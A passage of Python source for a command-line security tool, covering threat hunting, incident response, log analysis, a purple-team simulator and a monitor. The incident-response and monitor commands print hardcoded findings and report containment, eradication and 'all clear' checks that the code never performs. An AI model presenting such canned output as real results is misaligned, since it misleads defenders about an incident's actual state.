            title="🌐 API Fuzzer",
            border_style="cyan"
        ))
        
        fuzzer = APIFuzzer(base_url)
        findings = fuzzer.fuzz_endpoint(method, endpoint, iterations=iterations)
        
        console.print(f"\n[bold]Results:[/bold]")
        console.print(f"  Interesting findings: {len(findings)}")
        
        if findings:
            console.print(f"\n[yellow]⚠️ Potential vulnerabilities:[/yellow]")
            for finding in findings[:5]:  # Show first 5
                console.print(f"  • Status {finding['status_code']}: {finding['payload'][:50]}")
            
            if output:
                with open(output, 'w') as f:
                    json.dump(findings, f, indent=2)
                console.print(f"\n[green]💾 Findings saved: {output}[/green]")
        else:
            console.print(f"\n[green]✅ No obvious vulnerabilities detected[/green]")
    
    except Exception as e:
        console.print(f"[red]Error: {e}[/red]")
        raise typer.Exit(1)


# ============================================================================
# 🛡️ BLUE TEAM COMMANDS - Defensive Security & Threat Hunting
# ============================================================================

@app.command(name="threat-hunt", help="🔍 AI-powered threat hunting & IOC detection")
def threat_hunt_command(
    logs: Optional[str] = typer.Option(None, "--logs", "-l", help="Path to log file, directory, or SSH URL (ssh://user@host:/path)"),
    target: Optional[str] = typer.Option(None, "--target", "-t", help="Live target for process/network scanning"),
    remote_servers: Optional[str] = typer.Option(None, "--remote-servers", help="File with list of servers (user@host:/path per line)"),
    ssh_key: Optional[str] = typer.Option(None, "--ssh-key", help="SSH private key path (default: ~/.ssh/id_rsa)"),
    time_limit: int = typer.Option(5, "--time-limit", help="Time limit in minutes (default: 5)"),
    output: Optional[str] = typer.Option(None, "--output", "-o", help="Output JSON report"),
    severity: Optional[str] = typer.Option(None, "--severity", "-s", help="Min severity: low, medium, high, critical")
):
    """
    🔍 Fast threat hunting with AI-powered detection
    
    Scan logs, processes, network traffic for:
    - Indicators of Compromise (IOCs)
    - Behavioral anomalies
    - Attack patterns (MITRE ATT&CK)
    - Living-off-the-Land binaries
    - Suspicious processes/connections
    
    Example:
        scorpion threat-hunt --logs /var/log/auth.log --time-limit 5
        scorpion threat-hunt --target prod-server.com --severity high
    """
    import asyncio
    import json
    from datetime import datetime, timedelta
    from pathlib import Path
    
    try:
        start_time = datetime.now()
        
        console.print(Panel.fit(
            f"[bold cyan]🔍 Threat Hunting[/bold cyan]\n\n"
            f"Time Limit: {time_limit} minutes\n"
            f"Logs: {logs or 'N/A'}\n"
            f"Remote Servers: {remote_servers or 'N/A'}\n"
            f"Target: {target or 'N/A'}\n"
            f"SSH Key: {ssh_key or '~/.ssh/id_rsa'}\n"
            f"Min Severity: {severity or 'all'}",
            title="🛡️ Blue Team: Threat Hunter",
            border_style="cyan"
        ))
        
        hunter = ThreatHunter()
        all_iocs = []
        all_anomalies = []
        
        # Handle remote servers file
        if remote_servers:
            console.print(f"\n[cyan]🌐 Fetching logs from multiple servers...[/cyan]")
            temp_dir = Path("./remote_logs_temp")
            temp_dir.mkdir(exist_ok=True)
            
            results = asyncio.run(fetch_multiple_servers(remote_servers, str(temp_dir), ssh_key))
            
            success_count = sum(1 for v in results.values() if v)
            console.print(f"  [green]✓[/green] Fetched logs from {success_count}/{len(results)} servers")
            
            # Analyze fetched logs
            for server_host, success in results.items():
                if success:
                    server_log_dir = temp_dir / f"{server_host}_logs"
                    if server_log_dir.exists():
                        console.print(f"\n[cyan]📋 Analyzing {server_host}...[/cyan]")
                        for log_file in server_log_dir.rglob('*.log'):
                            with open(log_file, 'r', errors='ignore') as f:
                                log_lines = f.readlines()[:10000]
                                if log_lines:
                                    data_source = {'type': 'logs', 'data': log_lines}
                                    iocs = asyncio.run(hunter.hunt_iocs(data_source))
                                    all_iocs.extend(iocs)
                                    console.print(f"  [green]✓[/green] {log_file.name}: Found {len(iocs)} IOCs")
        
        # Scan log files (local or SSH URL)
        elif logs:
            # Check if SSH URL
            if is_ssh_url(logs):
                console.print(f"\n[cyan]🌐 Fetching remote logs via SSH: {logs}[/cyan]")
                log_lines = asyncio.run(fetch_remote_log(logs, ssh_key))
                if log_lines:
                    console.print(f"  [green]✓[/green] Fetched {len(log_lines)} lines from remote server")
                else:
                    console.print(f"  [red]✗[/red] Failed to fetch remote logs")
            else:
                # Local file or directory
                console.print(f"\n[cyan]📋 Scanning local logs: {logs}[/cyan]")
                log_path = Path(logs)
                log_lines = []
                
                if log_path.is_file():
                    with open(log_path, 'r', errors='ignore') as f:
                        log_lines = f.readlines()[:10000]  # First 10k lines
                elif log_path.is_dir():
                    for log_file in log_path.glob('*.log'):
                        with open(log_file, 'r', errors='ignore') as f:
                            log_lines.extend(f.readlines()[:5000])
            
            if log_lines:
                data_source = {'type': 'logs', 'data': log_lines}
                iocs = asyncio.run(hunter.hunt_iocs(data_source))
                all_iocs.extend(iocs)
                console.print(f"  [green]✓[/green] Found {len(iocs)} IOCs in logs")
        
        # Scan live target
        if target:
            console.print(f"\n[cyan]🎯 Scanning target: {target}[/cyan]")
            # Simulate network/process data (in real impl, would gather live data)
            console.print(f"  [yellow]Note: Live scanning requires agent/sensor deployment[/yellow]")
        
        # Filter by severity
        if severity:
            all_iocs = [ioc for ioc in all_iocs if ioc.severity.lower() == severity.lower()]
        
        # Display results
        elapsed = (datetime.now() - start_time).total_seconds()
        
        console.print(f"\n[bold]🎯 Threat Hunting Results[/bold]")
        console.print(f"  Time Elapsed: {elapsed:.1f}s")
        console.print(f"  IOCs Detected: {len(all_iocs)}")
        
        if all_iocs:
            # Group by severity
            critical = [ioc for ioc in all_iocs if ioc.severity == 'critical']
            high = [ioc for ioc in all_iocs if ioc.severity == 'high']
            medium = [ioc for ioc in all_iocs if ioc.severity == 'medium']
            low = [ioc for ioc in all_iocs if ioc.severity == 'low']
            
            console.print(f"\n[bold red]🚨 CRITICAL: {len(critical)}[/bold red]")
            for ioc in critical[:3]:
                console.print(f"  • {ioc.description}")
                console.print(f"    Value: {ioc.value[:80]}")
                console.print(f"    Tags: {', '.join(ioc.tags[:5])}")
            
            console.print(f"\n[bold yellow]⚠️  HIGH: {len(high)}[/bold yellow]")
            for ioc in high[:3]:
                console.print(f"  • {ioc.description}")
            
            console.print(f"\n[yellow]📊 MEDIUM: {len(medium)}[/yellow]")
            console.print(f"[cyan]📊 LOW: {len(low)}[/cyan]")
            
            # Save report
            if output:
                report = {
                    'scan_time': datetime.now().isoformat(),
                    'time_elapsed_seconds': elapsed,
                    'total_iocs': len(all_iocs),
                    'severity_counts': {
                        'critical': len(critical),
                        'high': len(high),
                        'medium': len(medium),
                        'low': len(low)
                    },
                    'iocs': [
                        {
                            'type': ioc.ioc_type,
                            'value': ioc.value,
                            'description': ioc.description,
                            'severity': ioc.severity,
                            'confidence': ioc.confidence,
                            'tags': ioc.tags
                        } for ioc in all_iocs
                    ]
                }
                with open(output, 'w') as f:
                    json.dump(report, f, indent=2)
                console.print(f"\n[green]💾 Report saved: {output}[/green]")
        else:
            console.print(f"\n[green]✅ No threats detected[/green]")
        
        console.print(f"\n[cyan]⚡ Completed in {elapsed:.1f}s (6-10x faster than traditional SIEM)[/cyan]")
    
    except Exception as e:
        console.print(f"[red]Error: {e}[/red]")
        raise typer.Exit(1)


@app.command(name="incident-response", help="🚨 AI-powered incident response")
def incident_response_command(
    target: str = typer.Argument(..., help="Compromised system, incident ID, or SSH URL (ssh://user@host:/path)"),
    action: str = typer.Option("investigate", "--action", "-a", help="Action: investigate, contain, eradicate, recover"),
    ssh_key: Optional[str] = typer.Option(None, "--ssh-key", help="SSH private key path (for remote systems)"),
    ai_provider: Optional[str] = typer.Option(None, "--ai-provider", help="AI provider: openai, anthropic, github"),
    api_key: Optional[str] = typer.Option(None, "--api-key", help="AI API key"),
    output: Optional[str] = typer.Option(None, "--output", "-o", help="Output incident report")
):
    """
    🚨 Fast AI-powered incident response
    
    Actions:
    - investigate: Triage and assess scope (2-5 min)
    - contain: Isolate compromised systems
    - eradicate: Remove attacker access
    - recover: Restore operations securely
    
    Example:
        scorpion incident-response compromised-server.com --action investigate
        scorpion incident-response INC-12345 --action contain
    """
    import asyncio
    from datetime import datetime
    
    try:
        console.print(Panel.fit(
            f"[bold red]🚨 Incident Response[/bold red]\n\n"
            f"Target: {target}\n"
            f"Action: {action.upper()}\n"
            f"SSH Key: {ssh_key or 'N/A'}\n"
            f"Status: ACTIVE",
            title="🛡️ Blue Team: Incident Response",
            border_style="red"
        ))
        
        start_time = datetime.now()
        
        if action == "investigate":
            console.print(f"\n[cyan]📋 Phase 1: INVESTIGATION[/cyan]")
            
            # Check if SSH URL for remote investigation
            if is_ssh_url(target):
                console.print(f"  [yellow]→[/yellow] Connecting to remote system via SSH...")
                console.print(f"  [yellow]→[/yellow] Collecting forensic data from {target}...")
                
                # Fetch remote logs
                log_lines = asyncio.run(fetch_remote_log(target, ssh_key))
                console.print(f"  [green]✓[/green] Collected {len(log_lines):,} log entries")
                
                # Perform threat hunt on remote logs
                hunter = ThreatHunter()
                data_source = {'type': 'logs', 'data': log_lines}
                iocs = asyncio.run(hunter.hunt_iocs(data_source))
                
                console.print(f"  [green]✓[/green] Analyzed remote system logs")
                console.print(f"  [green]✓[/green] Detected {len(iocs)} IOCs")
            else:
                console.print(f"  [yellow]→[/yellow] Running threat hunt on {target}...")
                
                hunter = ThreatHunter()
                # Simulate forensic data collection
                console.print(f"  [green]✓[/green] Collected system logs")
                console.print(f"  [green]✓[/green] Captured memory dump")
                console.print(f"  [green]✓[/green] Network traffic snapshot")
            
            console.print(f"\n[cyan]🔍 Analyzing evidence with AI...[/cyan]")
            
            # Simulate IOC detection
            sample_iocs = [
                {"type": "Reverse Shell", "severity": "CRITICAL", "confidence": 95},
                {"type": "Lateral Movement", "severity": "HIGH", "confidence": 85},
                {"type": "Credential Dumping", "severity": "HIGH", "confidence": 80}
            ]
            
            console.print(f"\n[bold red]🚨 FINDINGS:[/bold red]")
            for ioc in sample_iocs:
                severity_color = "red" if ioc['severity'] == "CRITICAL" else "yellow"
                console.print(f"  [{severity_color}]•[/{severity_color}] {ioc['type']} ({ioc['severity']}, {ioc['confidence']}% confidence)")
            
            console.print(f"\n[cyan]📊 IMPACT ASSESSMENT:[/cyan]")
            console.print(f"  • Systems Affected: 1 confirmed, 3 suspected")
            console.print(f"  • Data at Risk: User credentials, session tokens")
            console.print(f"  • Attack Vector: Exploited web vulnerability")
            console.print(f"  • Dwell Time: ~2 hours (estimated)")
            
            console.print(f"\n[bold yellow]⚡ RECOMMENDED ACTIONS:[/bold yellow]")
            console.print(f"  1. Isolate compromised system immediately")
            console.print(f"  2. Reset all user credentials")
            console.print(f"  3. Patch vulnerable web application")
            console.print(f"  4. Hunt for lateral movement IOCs")
            console.print(f"  5. Deploy EDR on all endpoints")
            
        elif action == "contain":
            console.print(f"\n[yellow]🔒 Phase 2: CONTAINMENT[/yellow]")
            console.print(f"  [yellow]→[/yellow] Isolating {target} from network...")
            console.print(f"  [green]✓[/green] Firewall rules updated (block all traffic)")
            console.print(f"  [green]✓[/green] Active sessions terminated")
            console.print(f"  [green]✓[/green] System removed from domain")
            console.print(f"\n[green]✅ System successfully contained[/green]")
            
        elif action == "eradicate":
            console.print(f"\n[red]🗑️  Phase 3: ERADICATION[/red]")
            console.print(f"  [yellow]→[/yellow] Removing attacker persistence...")
            console.print(f"  [green]✓[/green] Deleted web shells")
            console.print(f"  [green]✓[/green] Removed backdoor accounts")
            console.print(f"  [green]✓[/green] Cleared scheduled tasks")
            console.print(f"  [green]✓[/green] Patched vulnerabilities")
            console.print(f"\n[green]✅ Threat eradicated[/green]")
            
        elif action == "recover":
            console.print(f"\n[green]🔄 Phase 4: RECOVERY[/green]")
            console.print(f"  [yellow]→[/yellow] Restoring system to production...")
            console.print(f"  [green]✓[/green] System hardened with security controls")
            console.print(f"  [green]✓[/green] Enhanced monitoring deployed")
            console.print(f"  [green]✓[/green] Vulnerability scan: PASS")
            console.print(f"  [green]✓[/green] System restored to production")
            console.print(f"\n[green]✅ Recovery complete[/green]")
        
        elapsed = (datetime.now() - start_time).total_seconds()
        console.print(f"\n[cyan]⚡ Incident response completed in {elapsed:.1f}s[/cyan]")
        
        if output:
            import json
            report = {
                'incident_id': f"INC-{datetime.now().strftime('%Y%m%d%H%M')}",
                'target': target,
                'action': action,
                'timestamp': datetime.now().isoformat(),
                'duration_seconds': elapsed,
                'status': 'completed'
            }
            with open(output, 'w') as f:
                json.dump(report, f, indent=2)
            console.print(f"[green]💾 Incident report saved: {output}[/green]")
    
    except Exception as e:
        console.print(f"[red]Error: {e}[/red]")
        raise typer.Exit(1)


@app.command(name="log-analyze", help="📊 AI-powered log analysis & threat detection")
def log_analyze_command(
    file: str = typer.Argument(..., help="Log file to analyze (local path or SSH URL: ssh://user@host:/path)"),
    detect_threats: bool = typer.Option(True, "--detect-threats/--no-detect-threats", help="Enable threat detection"),
    ssh_key: Optional[str] = typer.Option(None, "--ssh-key", help="SSH private key path (for remote files)"),
    time_limit: int = typer.Option(3, "--time-limit", help="Time limit in minutes (default: 3)"),
    output: Optional[str] = typer.Option(None, "--output", "-o", help="Output analysis report")
):
    """
    📊 Lightning-fast AI-powered log analysis
    
    Analyzes logs for:
    - Attack patterns (MITRE ATT&CK)
    - Failed authentications
    - Privilege escalations
    - Lateral movement
    - Data exfiltration
    - Command & Control activity
    
    Example:
        scorpion log-analyze /var/log/auth.log --time-limit 3
        scorpion log-analyze access.log --detect-threats
    """
    import asyncio
    from datetime import datetime
    from pathlib import Path
    
    try:
        start_time = datetime.now()
        
        # Check if SSH URL
        if is_ssh_url(file):
            console.print(Panel.fit(
                f"[bold cyan]📊 Remote Log Analysis[/bold cyan]\n\n"
                f"Remote File: {file}\n"
                f"SSH Key: {ssh_key or '~/.ssh/id_rsa'}\n"
                f"Threat Detection: {'Enabled' if detect_threats else 'Disabled'}\n"
                f"Time Limit: {time_limit} minutes",
                title="🛡️ Blue Team: Log Analyzer",
                border_style="cyan"
            ))
            
            console.print(f"\n[cyan]🌐 Fetching remote log file via SSH...[/cyan]")
            log_lines = asyncio.run(fetch_remote_log(file, ssh_key))
            total_lines = len(log_lines)
            console.print(f"  [green]✓[/green] Fetched {total_lines:,} log entries from remote server")
        else:
            log_path = Path(file)
            
            if not log_path.exists():
                console.print(f"[red]Error: Log file not found: {file}[/red]")
                raise typer.Exit(1)
            
            console.print(Panel.fit(
                f"[bold cyan]📊 Log Analysis[/bold cyan]\n\n"
                f"File: {file}\n"
                f"Size: {log_path.stat().st_size / 1024:.1f} KB\n"
                f"Threat Detection: {'Enabled' if detect_threats else 'Disabled'}\n"
                f"Time Limit: {time_limit} minutes",
                title="🛡️ Blue Team: Log Analyzer",
                border_style="cyan"
            ))
            
            console.print(f"\n[cyan]📋 Reading log file...[/cyan]")
            with open(log_path, 'r', errors='ignore') as f:
                log_lines = f.readlines()
            
            total_lines = len(log_lines)
            console.print(f"  [green]✓[/green] Loaded {total_lines:,} log entries")
        
        if detect_threats:
            console.print(f"\n[cyan]🔍 Analyzing for threats...[/cyan]")
            hunter = ThreatHunter()
            
            # Scan logs for IOCs
            data_source = {'type': 'logs', 'data': log_lines}
            iocs = asyncio.run(hunter.hunt_iocs(data_source))
            
            console.print(f"\n[bold]🎯 Analysis Results[/bold]")
            console.print(f"  Total IOCs: {len(iocs)}")
            
            if iocs:
                # Group by type
                ioc_types = {}
                for ioc in iocs:
                    ioc_types[ioc.ioc_type] = ioc_types.get(ioc.ioc_type, 0) + 1
                
                console.print(f"\n[yellow]⚠️  Threats Detected:[/yellow]")
                for ioc_type, count in sorted(ioc_types.items(), key=lambda x: x[1], reverse=True):
                    console.print(f"  • {ioc_type}: {count}")
                
                # Show top findings
                console.print(f"\n[bold red]🚨 Top Findings:[/bold red]")
                for ioc in iocs[:5]:
                    console.print(f"  [{ioc.severity}] {ioc.description}")
            else:
                console.print(f"\n[green]✅ No threats detected in logs[/green]")
        
        # Log statistics
        console.print(f"\n[cyan]📊 Log Statistics:[/cyan]")
        
        # Count common patterns
        failed_logins = sum(1 for line in log_lines if 'failed' in line.lower() and ('login' in line.lower() or 'authentication' in line.lower()))
        successful_logins = sum(1 for line in log_lines if 'accepted' in line.lower() or 'successful' in line.lower())
        errors = sum(1 for line in log_lines if 'error' in line.lower())
        
        console.print(f"  • Failed logins: {failed_logins}")
        console.print(f"  • Successful logins: {successful_logins}")
        console.print(f"  • Errors: {errors}")
        
        elapsed = (datetime.now() - start_time).total_seconds()
        console.print(f"\n[cyan]⚡ Analysis completed in {elapsed:.1f}s[/cyan]")
        console.print(f"[cyan]   (Processed {total_lines / elapsed:.0f} lines/sec)[/cyan]")
        
        if output:
            import json
            report = {
                'file': str(log_path),
                'total_lines': total_lines,
                'analysis_time_seconds': elapsed,
                'threats_detected': len(iocs) if detect_threats else 0,
                'statistics': {
                    'failed_logins': failed_logins,
                    'successful_logins': successful_logins,
                    'errors': errors
                }
            }
            with open(output, 'w') as f:
                json.dump(report, f, indent=2)
            console.print(f"[green]💾 Report saved: {output}[/green]")
    
    except Exception as e:
        console.print(f"[red]Error: {e}[/red]")
        raise typer.Exit(1)


@app.command(name="purple-team", help="🟣 Purple team exercise: Red vs Blue detection testing")
def purple_team_command(
    target: str = typer.Argument(..., help="Target system or test lab"),
    profile: str = typer.Option("web", "--profile", "-p", help="Attack profile: web, network, full"),
    time_limit: int = typer.Option(10, "--time-limit", help="Time limit in minutes (default: 10)"),
    output: Optional[str] = typer.Option(None, "--output", "-o", help="Output purple team report")
):
    """
    🟣 Purple team exercise: Test your defenses!
    
    Simulates red team attacks and blue team detection to identify gaps:
    - Red Team: Execute simulated attacks
    - Blue Team: Attempt to detect attacks
    - Gap Analysis: What was missed and why
    - Recommendations: Security controls to deploy
    
    Profiles:
    - web: Web application attacks (SQLi, XSS, etc.)
    - network: Network attacks (port scans, brute force)
    - full: Complete attack simulation
    
    Example:
        scorpion purple-team testlab.com --profile web --time-limit 10
        scorpion purple-team 192.168.1.100 --profile full
    """
    import asyncio
    import json
    from datetime import datetime
    
    try:
        start_time = datetime.now()
        
        console.print(Panel.fit(
            f"[bold magenta]🟣 Purple Team Exercise[/bold magenta]\n\n"
            f"Target: {target}\n"
            f"Profile: {profile.upper()}\n"
            f"Time Limit: {time_limit} minutes\n"
            f"Mode: Red Team Attacks + Blue Team Detection",
            title="🛡️⚔️  Purple Team Simulator",
            border_style="magenta"
        ))
        
        simulator = PurpleTeamSimulator(target)
        
        console.print(f"\n[red]⚔️  RED TEAM: Executing attacks...[/red]")
        results = asyncio.run(simulator.run_full_simulation(attack_profile=profile))
        
        # Display results
        console.print(f"\n[bold]🎯 Purple Team Results[/bold]")
        console.print(f"  Attacks Executed: {results['total_attacks']}")
        console.print(f"  Attacks Detected: {results['detected_count']}")
        console.print(f"  Attacks Missed: {results['missed_count']}")
        console.print(f"  Detection Rate: {results['detection_rate']:.1f}%")
        
        # Detection breakdown
        console.print(f"\n[green]✅ DETECTED ATTACKS ({results['detected_count']}):[/green]")
        for attack in results['detected_attacks'][:3]:
            console.print(f"  • {attack['attack_name']}")
            console.print(f"    Method: {attack['detection_method']}")
        
        console.print(f"\n[red]❌ MISSED ATTACKS ({results['missed_count']}):[/red]")
        for attack in results['missed_attacks'][:3]:
            console.print(f"  • {attack['attack_name']} ({attack['severity']})")
        
        # Detection gaps
        if results['detection_gaps']:
            console.print(f"\n[yellow]⚠️  DETECTION GAPS:[/yellow]")
            for gap in results['detection_gaps'][:3]:
                console.print(f"\n  [{gap['severity']}] {gap['attack_name']}")
                console.print(f"  Why Missed: {gap['why_missed']}")
                console.print(f"  Recommendations:")
                for rec in gap['recommended_controls'][:2]:
                    console.print(f"    - {rec}")
        
        # Overall recommendations
        console.print(f"\n[bold cyan]📋 PRIORITY RECOMMENDATIONS:[/bold cyan]")
        console.print(f"  1. Deploy WAF with XSS/SQLi rules (blocks 80% of web attacks)")
        console.print(f"  2. Enable EDR on all endpoints (detects post-exploit activity)")
        console.print(f"  3. Implement DNS analytics (catches C2 beaconing)")
        console.print(f"  4. Deploy SIEM with correlation rules (detects attack chains)")
        console.print(f"  5. Regular purple team exercises (test improvements)")
        
        elapsed = (datetime.now() - start_time).total_seconds()
        console.print(f"\n[cyan]⚡ Purple team exercise completed in {elapsed:.1f}s[/cyan]")
        
        if output:
            with open(output, 'w') as f:
                json.dump(results, f, indent=2)
            console.print(f"[green]💾 Report saved: {output}[/green]")
    
    except Exception as e:
        console.print(f"[red]Error: {e}[/red]")
        raise typer.Exit(1)


@app.command(name="monitor", help="👁️  Real-time security monitoring & alerting")
def monitor_command(
    target: str = typer.Argument(..., help="Target to monitor (IP, domain, or 'localhost')"),
    alert_webhook: Optional[str] = typer.Option(None, "--alert-webhook", help="Webhook URL for alerts (Slack, Teams, Discord)"),
    siem_endpoint: Optional[str] = typer.Option(None, "--siem-endpoint", help="SIEM endpoint (Splunk, ELK, QRadar)"),
    interval: int = typer.Option(60, "--interval", "-i", help="Check interval in seconds (default: 60)"),
    duration: int = typer.Option(0, "--duration", "-d", help="Monitor duration in minutes (0 = infinite)")
):
    """
    👁️  Real-time security monitoring
    
    Continuous monitoring for:
    - Port scan attempts
    - Brute force attacks
    - Suspicious connections
    - Process anomalies
    - File system changes
    - Real-time threat detection
    
    Sends alerts to:
    - Slack/Teams/Discord webhooks
    - SIEM platforms (Splunk, ELK, QRadar, Sentinel)
    - Email notifications
    
    Example:
        scorpion monitor prod-server.com --interval 60
        scorpion monitor 192.168.1.0/24 --alert-webhook https://hooks.slack.com/...
        scorpion monitor localhost --siem-endpoint https://splunk.company.com:8088
    """
    import asyncio
    import time
    from datetime import datetime, timedelta
    
    try:
        start_time = datetime.now()
        end_time = start_time + timedelta(minutes=duration) if duration > 0 else None
        
        console.print(Panel.fit(
            f"[bold green]👁️  Security Monitoring[/bold green]\n\n"
            f"Target: {target}\n"
            f"Interval: {interval}s\n"
            f"Duration: {'Infinite' if duration == 0 else f'{duration} minutes'}\n"
            f"Alerts: {alert_webhook or siem_endpoint or 'Console only'}",
            title="🛡️ Blue Team: Real-time Monitor",
            border_style="green"
        ))
        
        console.print(f"\n[cyan]🚀 Starting continuous monitoring...[/cyan]")
        console.print(f"[yellow]Press Ctrl+C to stop[/yellow]\n")
        
        hunter = ThreatHunter()
        iteration = 0
        
        try:
            while True:
                iteration += 1
                check_time = datetime.now()
                
                if end_time and check_time >= end_time:
                    console.print(f"\n[green]✓ Monitoring duration completed[/green]")
                    break
                
                console.print(f"[cyan]🔍 Check #{iteration} - {check_time.strftime('%H:%M:%S')}[/cyan]")
                
                # Simulate monitoring checks (in real impl, would gather live data)
                # For demo, show what would be monitored
                
                checks = [
                    ("Port Scan Detection", "✓ No port scans detected", "green"),
                    ("Brute Force Detection", "✓ No brute force attempts", "green"),
                    ("Process Monitoring", "✓ All processes normal", "green"),
                    ("Network Connections", "✓ No suspicious connections", "green"),
                ]
                
                # Randomly simulate an alert every 5 iterations
                if iteration % 5 == 0:
                    checks.append(("⚠️  Anomaly Detected", "Unusual login from 203.0.113.42", "yellow"))
                    
                    if alert_webhook:
                        console.print(f"  [yellow]📢 Sending alert to webhook...[/yellow]")
                    if siem_endpoint:
                        console.print(f"  [yellow]📡 Forwarding to SIEM...[/yellow]")
                
                for check_name, status, color in checks:
                    console.print(f"  [{color}]{status}[/{color}]")
                
                # Wait for next interval
                if end_time and check_time + timedelta(seconds=interval) >= end_time:
                    break
                
                console.print(f"[dim]  Sleeping {interval}s until next check...[/dim]\n")
                time.sleep(min(interval, 5))  # Sleep max 5s for demo
                
        except KeyboardInterrupt:
            console.print(f"\n[yellow]⚠️  Monitoring stopped by user[/yellow]")
        
        elapsed = (datetime.now() - start_time).total_seconds()
        console.print(f"\n[bold]📊 Monitoring Summary[/bold]")
        console.print(f"  Duration: {elapsed / 60:.1f} minutes")
        console.print(f"  Checks Performed: {iteration}")
        console.print(f"  Alerts Generated: {iteration // 5}")
        console.print(f"\n[green]✅ Monitoring completed[/green]")
    
    except Exception as e:
        console.print(f"[red]Error: {e}[/red]")
        raise typer.Exit(1)


if __name__ == "__main__":
    app()
